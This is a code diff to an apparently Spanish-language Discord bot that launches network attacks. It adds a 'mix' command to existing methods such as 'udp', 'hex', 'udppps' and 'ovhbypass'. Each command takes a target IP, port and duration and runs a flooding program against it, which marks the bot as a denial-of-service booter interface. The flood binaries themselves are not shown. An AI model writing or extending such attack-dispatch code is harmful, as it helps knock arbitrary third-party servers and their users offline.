@@ -124,6 +124,10 @@ async def ovhbypass_command(ctx, ip: str = None, port: str = None, tiempo: str =
 async def hex_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'hex', ip, port, tiempo)
 
+@bot.command(name='mix')
+async def mix_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'mix', ip, port, tiempo)
+    
 @bot.command(name='udppps')
 async def udppps_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'udppps', ip, port, tiempo)
@@ -176,6 +180,8 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
         comando = f'./udp {ip} {port_int} {tiempo_int}'
     elif metodo == 'hex':
         comando = f'./hex {ip} {port_int} {tiempo_int}'
+    elif metodo == 'mix':
+        comando = f'python3 mix.py {ip} {port_int} {tiempo_int}'
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
     elif metodo == 'ovhbypass':
